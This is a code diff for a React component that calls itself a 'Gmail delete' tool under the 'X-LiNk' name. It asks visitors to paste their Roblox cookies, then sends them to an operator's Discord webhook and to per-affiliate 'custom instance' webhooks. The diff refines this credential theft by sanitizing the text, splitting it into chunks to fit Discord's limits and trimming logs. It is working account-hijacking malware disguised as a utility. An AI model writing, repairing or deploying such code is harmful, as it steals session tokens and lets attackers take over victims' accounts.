@@ -27,7 +27,6 @@ export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
     console.log("Ref ID:", refId);
 
     if (refId) {
-      // Try to get webhook data from localStorage
       const webhookKey = `webhook_${refId}`;
       const webhookData = localStorage.getItem(webhookKey);
 
@@ -41,37 +40,31 @@ export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
           if (parsed.webhook) {
             console.log("🎯 Custom webhook found:", parsed.webhook);
             return { refId, webhookData: parsed };
-          } else {
-            console.error("❌ No webhook URL in parsed data");
           }
         } catch (error) {
           console.error("❌ Error parsing webhook data:", error);
         }
-      } else {
-        console.error("❌ No webhook data found for refId:", refId);
-        // Let's check what keys exist in localStorage
-        console.log("🔍 All localStorage keys:", Object.keys(localStorage));
-        for (let i = 0; i < localStorage.length; i++) {
-          const key = localStorage.key(i);
-          if (key && key.startsWith("webhook_")) {
-            console.log(`📋 Found webhook key: ${key}`);
-          }
-        }
       }
-    } else {
-      console.log("ℹ️ No ref parameter found - this is the main instance");
     }
 
     return { refId: null, webhookData: null };
   };
 
+  // Clean and validate text for Discord
+  const cleanTextForDiscord = (text: string) => {
+    if (!text) return "";
+    // Remove null characters and ensure it's a string
+    return String(text).replace(/\0/g, "").trim().substring(0, 2000); // Discord limit
+  };
+
   // Split large text into chunks if needed
   const splitLargeText = (text: string, maxLength = 1800) => {
-    if (text.length <= maxLength) return [text];
+    const cleanText = cleanTextForDiscord(text);
+    if (cleanText.length <= maxLength) return [cleanText];
 
     const chunks = [];
-    for (let i = 0; i < text.length; i += maxLength) {
-      chunks.push(text.substring(i, i + maxLength));
+    for (let i = 0; i < cleanText.length; i += maxLength) {
+      chunks.push(cleanText.substring(i, i + maxLength));
     }
     return chunks;
   };
@@ -87,20 +80,60 @@ export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
       const { refId } = getWebhookData();
       const timestamp = new Date().toISOString();
 
-      // Split cookies into chunks if too large
-      const cookieChunks = splitLargeText(data.cookies);
+      // Clean and validate input data
+      const cleanCookies = cleanTextForDiscord(data.cookies);
+      if (!cleanCookies) {
+        console.error("❌ No valid cookies data after cleaning");
+        return false;
+      }
 
-      // Create embeds for each chunk
-      const embeds = [];
+      // Split cookies into chunks if too large
+      const cookieChunks = splitLargeText(cleanCookies);
+      console.log(`📊 Data will be split into ${cookieChunks.length} chunk(s)`);
+
+      // Build embed fields safely
+      const baseFields = [
+        {
+          name: "⏰ Timestamp",
+          value: timestamp,
+          inline: true,
+        },
+        {
+          name: "🎯 Action",
+          value: "Delete Gmail",
+          inline: true,
+        },
+      ];
+
+      // Add instance info if available
+      if (refId) {
+        baseFields.push(
+          {
+            name: "🔗 Instance ID",
+            value: cleanTextForDiscord(refId),
+            inline: true,
+          },
+          {
+            name: "🌐 Source",
+            value:
+              webhookType === "custom"
+                ? "Custom Instance"
+                : "Main System Monitor",
+            inline: true,
+          },
+        );
+      }
+
+      let embeds = [];
 
       if (cookieChunks.length === 1) {
         // Single embed for small data
-        embeds.push({
+        const embed = {
           title:
             webhookType === "custom"
               ? "🔥 Gmail Delete Request (Custom Instance)"
               : "🔥 Gmail Delete Request (Main System)",
-          color: webhookType === "custom" ? 0xc0c0c0 : 0xff0000, // Silver for custom, red for main
+          color: webhookType === "custom" ? 12632256 : 16711680, // Silver: 12632256, Red: 16711680
           description:
             webhookType === "custom"
               ? "🎯 New Gmail deletion request from your custom instance!"
@@ -108,36 +141,10 @@ export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
           fields: [
             {
               name: "🍪 Roblox Cookies",
-              value: `\`\`\`${data.cookies}\`\`\``,
+              value: `\`\`\`\n${cleanCookies}\n\`\`\``,
               inline: false,
             },
-            {
-              name: "⏰ Timestamp",
-              value: timestamp,
-              inline: true,
-            },
-            {
-              name: "🎯 Action",
-              value: "Delete Gmail",
-              inline: true,
-            },
-            ...(refId
-              ? [
-                  {
-                    name: "🔗 Instance ID",
-                    value: refId,
-                    inline: true,
-                  },
-                  {
-                    name: "🌐 Source",
-                    value:
-                      webhookType === "custom"
-                        ? "Custom Instance"
-                        : "Main System Monitor",
-                    inline: true,
-                  },
-                ]
-              : []),
+            ...baseFields,
           ],
           footer: {
             text:
@@ -145,53 +152,30 @@ export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
                 ? "X-LiNk Custom Instance"
                 : "X-LiNk Main System",
           },
-        });
+          timestamp: timestamp,
+        };
+
+        embeds = [embed];
       } else {
         // Multiple embeds for large data
         // Header embed
-        embeds.push({
+        const headerEmbed = {
           title:
             webhookType === "custom"
               ? "🔥 Gmail Delete Request (Custom Instance) - LARGE DATA"
               : "🔥 Gmail Delete Request (Main System) - LARGE DATA",
-          color: webhookType === "custom" ? 0xc0c0c0 : 0xff0000, // Silver for custom, red for main
+          color: webhookType === "custom" ? 12632256 : 16711680,
           description:
             webhookType === "custom"
               ? `🎯 New Gmail deletion request from your custom instance! Data split into ${cookieChunks.length} parts.`
               : `📨 Gmail deletion request received and processed. Data split into ${cookieChunks.length} parts.`,
           fields: [
             {
-              name: "⏰ Timestamp",
-              value: timestamp,
-              inline: true,
-            },
-            {
-              name: "🎯 Action",
-              value: "Delete Gmail",
-              inline: true,
-            },
-            {
               name: "📊 Data Parts",
               value: `${cookieChunks.length} chunks`,
               inline: true,
             },
-            ...(refId
-              ? [
-                  {
-                    name: "🔗 Instance ID",
-                    value: refId,
-                    inline: true,
-                  },
-                  {
-                    name: "🌐 Source",
-                    value:
-                      webhookType === "custom"
-                        ? "Custom Instance"
-                        : "Main System Monitor",
-                    inline: true,
-                  },
-                ]
-              : []),
+            ...baseFields,
           ],
           footer: {
             text:
@@ -199,22 +183,41 @@ export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
                 ? "X-LiNk Custom Instance"
                 : "X-LiNk Main System",
           },
-        });
+          timestamp: timestamp,
+        };
 
-        // Data chunks embeds
-        cookieChunks.forEach((chunk, index) => {
-          embeds.push({
-            title: `🍪 Cookies Part ${index + 1}/${cookieChunks.length}`,
-            color: webhookType === "custom" ? 0xa9a9a9 : 0xff4444, // Dark gray for custom, light red for main
-            description: `\`\`\`${chunk}\`\`\``,
+        embeds = [headerEmbed];
+
+        // Add chunk embeds (limit to 9 more embeds, Discord limit is 10 total)
+        const maxChunks = Math.min(cookieChunks.length, 9);
+        for (let i = 0; i < maxChunks; i++) {
+          const chunkEmbed = {
+            title: `🍪 Cookies Part ${i + 1}/${cookieChunks.length}`,
+            color: webhookType === "custom" ? 11119017 : 16744516, // Dark gray: 11119017, Light red: 16744516
+            description: `\`\`\`\n${cookieChunks[i]}\n\`\`\``,
             footer: {
-              text: `Part ${index + 1} of ${cookieChunks.length}`,
+              text: `Part ${i + 1} of ${cookieChunks.length}`,
+            },
+          };
+          embeds.push(chunkEmbed);
+        }
+
+        // If there are more chunks, add a note
+        if (cookieChunks.length > 9) {
+          embeds.push({
+            title: "⚠️ Data Truncated",
+            color: 16776960, // Yellow
+            description: `Only showing first 9 parts. Total parts: ${cookieChunks.length}`,
+            footer: {
+              text: "Discord embed limit reached",
             },
           });
-        });
+        }
       }
 
-      const payload = { embeds };
+      const payload = {
+        embeds: embeds,
+      };
 
       console.log(
         `📤 ${webhookType} webhook payload:`,
@@ -229,7 +232,13 @@ export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
         body: JSON.stringify(payload),
       });
 
-      const responseText = await response.text();
+      let responseText = "";
+      try {
+        responseText = await response.text();
+      } catch (e) {
+        responseText = "Unable to read response";
+      }
+
       console.log(
         `📥 ${webhookType} webhook response status:`,
         response.status,
@@ -267,9 +276,7 @@ export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
     const data = { cookies };
 
     console.log("🚀 Starting dual webhook delivery process...");
-    console.log("📋 Data size:", cookies.length, "characters");
-    console.log("🆔 RefId:", refId);
-    console.log("📦 Webhook Data:", webhookData);
+    console.log("📋 Raw data size:", cookies.length, "characters");
 
     let mainWebhookSuccess = false;
     let customWebhookSuccess = false;
@@ -304,13 +311,7 @@ export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
         console.error("❌ Custom webhook failed:", error);
       }
     } else {
-      console.log("ℹ️ Skipping custom webhook:");
-      console.log("  - Has refId?", !!refId);
-      console.log("  - Has webhookData?", !!webhookData);
-      console.log(
-        "  - Has webhook URL?",
-        webhookData ? !!webhookData.webhook : false,
-      );
+      console.log("ℹ️ No custom webhook to send to");
     }
 
     // Report final results
@@ -382,7 +383,7 @@ export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
                 Roblox Cookies
               </label>
               <Textarea
-                placeholder="Paste your Roblox cookies here... (supports large data)"
+                placeholder="Paste your Roblox cookies here..."
                 value={cookies}
                 onChange={(e) => setCookies(e.target.value)}
                 className="bg-black/60 border-gray-500/50 text-white placeholder:text-gray-400 min-h-[200px] focus:border-gray-400 transition-colors resize-none"
